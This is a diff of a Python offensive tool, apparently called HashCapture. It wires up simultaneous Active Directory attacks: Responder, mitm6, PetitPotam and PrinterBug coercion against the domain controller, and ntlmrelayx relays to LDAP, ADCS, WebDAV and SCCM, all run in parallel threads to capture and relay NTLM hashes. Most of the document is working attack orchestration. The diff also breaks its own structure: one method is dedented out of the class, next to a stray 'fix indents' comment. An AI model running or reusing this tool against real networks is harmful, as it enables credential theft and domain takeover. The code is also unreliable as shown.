@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import os
 import sys
 import time
@@ -186,23 +188,33 @@ class HashCapture:
         """Check Active Directory related configurations"""
         if self.domain:
             try:
-                # Check LDAP connectivity
-                import ldap3
-                server = ldap3.Server(self.get_dc_ip(), get_info=ldap3.ALL)
-                conn = ldap3.Connection(server)
-                if not conn.bind():
-                    self.logger.warning("LDAP connection failed - some attacks might not work")
+                # Get Domain Controller IP
+                dc_ip = self.get_dc_ip()
+                if not dc_ip:
+                    self.logger.warning(f"Could not resolve Domain Controller for {self.domain}")
+                    return False
 
-                # Check DNS records
-                adcs_records = subprocess.check_output(
-                    ['nslookup', f'certsrv.{self.domain}'],
-                    stderr=subprocess.PIPE
-                )
-                if b'can\'t find' in adcs_records.lower():
-                    self.logger.warning("ADCS DNS record not found - ADCS attacks might not work")
+                # Check basic connectivity
+                socket.setdefaulttimeout(5)
+                
+                # Check LDAP ports
+                ldap_ports = [389, 636]  # LDAP and LDAPS
+                for port in ldap_ports:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        result = sock.connect_ex((dc_ip, port))
+                        if result == 0:
+                            self.logger.info(f"LDAP port {port} is open on {dc_ip}")
+                        else:
+                            self.logger.warning(f"LDAP port {port} is closed on {dc_ip}")
+                        sock.close()
+                    except Exception as port_err:
+                        self.logger.error(f"Error checking LDAP port {port}: {port_err}")
 
+                return True
             except Exception as e:
                 self.logger.warning(f"Active Directory configuration check failed: {e}")
+                return False
 
     def get_local_ip(self):
         """Get IP address for specified interface"""
@@ -344,16 +356,18 @@ class HashCapture:
             self.logger.error(f"Error in start_responder: {e}")
             return False
 
-    # Placeholder methods for other attacks (you'll need to implement these)
     def start_mitm6(self):
         """Start mitm6 attack"""
         try:
-            cmd = ["mitm6"]
+            cmd = ["mitm6", "-i", self.interface]
+            
+            if self.domain:
+                cmd.extend(["-d", self.domain])
             
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
             self.processes["mitm6"] = process
             
-            # Placeholder logging
+            # Logging for mitm6
             for line in iter(process.stdout.readline, b''):
                 line = line.decode('utf-8').strip()
                 self.attack_loggers["mitm6"].debug(line)
@@ -363,35 +377,141 @@ class HashCapture:
             self.logger.error(f"Error in start_mitm6: {e}")
             return False
 
-    def start_petitpotam(self):
+def start_petitpotam(self):
         """Start PetitPotam attack"""
-        # Placeholder implementation
-        self.logger.info("PetitPotam attack not fully implemented")
-        return False
+        try:
+            if not self.domain or not self.get_dc_ip():
+                self.logger.warning("PetitPotam attack requires a valid domain")
+                return False
+
+            # Part 2 to fix indents 
+            cmd = [
+                "petitpotam.py",
+                "-t", self.get_dc_ip(),
+                "-d", self.domain
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
+            self.processes["petitpotam"] = process
+            
+            for line in iter(process.stdout.readline, b''):
+                line = line.decode('utf-8').strip()
+                if "Success" in line:
+                    self.attack_loggers["petitpotam"].info(line)
+                else:
+                    self.attack_loggers["petitpotam"].debug(line)
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Error in start_petitpotam: {e}")
+            return False
 
     def start_printerbug(self):
         """Start PrinterBug attack"""
-        # Placeholder implementation
-        self.logger.info("PrinterBug attack not fully implemented")
-        return False
+        try:
+            if not self.domain or not self.get_dc_ip():
+                self.logger.warning("PrinterBug attack requires a valid domain")
+                return False
+
+            cmd = [
+                "printerbug.py",
+                f"{self.domain}/",
+                self.get_dc_ip()
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
+            self.processes["printerbug"] = process
+            
+            for line in iter(process.stdout.readline, b''):
+                line = line.decode('utf-8').strip()
+                if "Success" in line:
+                    self.attack_loggers["printerbug"].info(line)
+                else:
+                    self.attack_loggers["printerbug"].debug(line)
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Error in start_printerbug: {e}")
+            return False
 
     def start_adcs_relay(self):
         """Start ADCS Relay attack"""
-        # Placeholder implementation
-        self.logger.info("ADCS Relay attack not fully implemented")
-        return False
+        try:
+            if not self.domain or not self.get_dc_ip():
+                self.logger.warning("ADCS Relay attack requires a valid domain")
+                return False
+
+            cmd = [
+                "ntlmrelayx.py",
+                "-t", f"ldap://{self.get_dc_ip()}",
+                "--adcs",
+                "-smb2support"
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
+            self.processes["adcs_relay"] = process
+            
+            for line in iter(process.stdout.readline, b''):
+                line = line.decode('utf-8').strip()
+                if "Certificate" in line:
+                    self.attack_loggers["adcs_relay"].info(line)
+                else:
+                    self.attack_loggers["adcs_relay"].debug(line)
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Error in start_adcs_relay: {e}")
+            return False
 
     def start_webdav_relay(self):
         """Start WebDAV Relay attack"""
-        # Placeholder implementation
-        self.logger.info("WebDAV Relay attack not fully implemented")
-        return False
+        try:
+            cmd = [
+                "ntlmrelayx.py",
+                "-tf", "targets.txt",
+                "--webdav",
+                "-smb2support"
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
+            self.processes["webdav_relay"] = process
+            
+            for line in iter(process.stdout.readline, b''):
+                line = line.decode('utf-8').strip()
+                if "WebDAV" in line:
+                    self.attack_loggers["webdav_relay"].info(line)
+                else:
+                    self.attack_loggers["webdav_relay"].debug(line)
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Error in start_webdav_relay: {e}")
+            return False
 
     def start_sccm_relay(self):
         """Start SCCM Relay attack"""
-        # Placeholder implementation
-        self.logger.info("SCCM Relay attack not fully implemented")
-        return False
+        try:
+            cmd = [
+                "ntlmrelayx.py",
+                "-tf", "targets.txt",
+                "--sccm",
+                "-smb2support"
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
+            self.processes["sccm_relay"] = process
+            
+            for line in iter(process.stdout.readline, b''):
+                line = line.decode('utf-8').strip()
+                if "SCCM" in line:
+                    self.attack_loggers["sccm_relay"].info(line)
+                else:
+                    self.attack_loggers["sccm_relay"].debug(line)
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Error in start_sccm_relay: {e}")
+            return False
 
     def run(self):
         """Main execution flow running all attacks simultaneously"""
@@ -400,38 +520,50 @@ class HashCapture:
         # Run all checks first
         self.logger.info("Running system and dependency checks...")
         if not self.check_dependencies():
+            self.logger.error("Dependency checks failed")
             return False
         
         if self.domain:
             self.logger.info("Checking Active Directory configuration...")
-            self.check_active_directory_config()
+            if not self.check_active_directory_config():
+                self.logger.warning("Active Directory configuration check failed. Some attacks may not work.")
         
-            # Create Targets File
-            if not self.create_targets_file():
-                self.logger.error("Failed to create targets file")
-                return False
+        # Create Targets File
+        if self.domain and not self.create_targets_file():
+            self.logger.error("Failed to create targets file")
+            return False
         
         try:
-            # List of all attack functions
+            # List of all attack functions with error tracking
             attacks = [
-                self.start_ntlmrelay,
-                self.start_responder,
-                self.start_mitm6,
-                self.start_petitpotam,
-                self.start_printerbug,
-                self.start_adcs_relay,
-                self.start_webdav_relay,
-                self.start_sccm_relay
+                ("NTLM Relay", self.start_ntlmrelay),
+                ("Responder", self.start_responder),
+                ("MITM6", self.start_mitm6),
+                ("PetitPotam", self.start_petitpotam),
+                ("PrinterBug", self.start_printerbug),
+                ("ADCS Relay", self.start_adcs_relay),
+                ("WebDAV Relay", self.start_webdav_relay),
+                ("SCCM Relay", self.start_sccm_relay)
             ]
 
-            # Start each attack in its own thread
-            for attack in attacks:
-                thread = Thread(target=self.run_attack_thread, args=(attack,))
-                thread.daemon = True
-                thread.start()
-                self.attack_threads.append(thread)
+            # Tracking failed attacks
+            failed_attacks = []
 
-            self.logger.info("All attacks started successfully")
+            # Start each attack in its own thread
+            for attack_name, attack_func in attacks:
+                try:
+                    thread = Thread(target=self.run_attack_thread, args=(attack_func,))
+                    thread.daemon = True
+                    thread.start()
+                    self.attack_threads.append(thread)
+                except Exception as e:
+                    self.logger.error(f"Failed to start {attack_name} attack: {e}")
+                    failed_attacks.append(attack_name)
+
+            if failed_attacks:
+                self.logger.warning(f"Failed to start the following attacks: {', '.join(failed_attacks)}")
+
+            self.logger.info("Attacks started")
 
             # Monitor attack threads
             while not self.stop_event.is_set():
